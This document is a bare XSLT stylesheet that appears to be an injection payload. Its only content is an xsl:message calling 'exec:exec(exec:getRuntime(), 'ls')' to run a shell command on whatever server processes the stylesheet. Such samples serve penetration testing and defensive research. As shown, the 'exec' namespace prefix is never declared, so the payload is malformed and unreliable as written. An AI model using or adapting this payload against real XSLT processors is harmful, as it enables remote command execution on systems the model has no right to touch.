

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:message>
    <xsl:value-of select="exec:exec(exec:getRuntime(), 'ls')" />
  </xsl:message>
</xsl:stylesheet>

